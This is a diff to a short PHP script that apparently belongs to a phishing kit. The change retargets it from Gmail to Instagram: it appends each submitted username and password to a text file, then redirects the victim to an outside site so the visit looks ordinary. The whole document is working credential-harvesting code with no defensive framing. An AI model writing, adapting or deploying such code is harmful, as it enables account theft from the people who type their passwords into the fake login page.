@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: ./result.html');
+file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://ezlikers.com/');
 exit();
 ?>
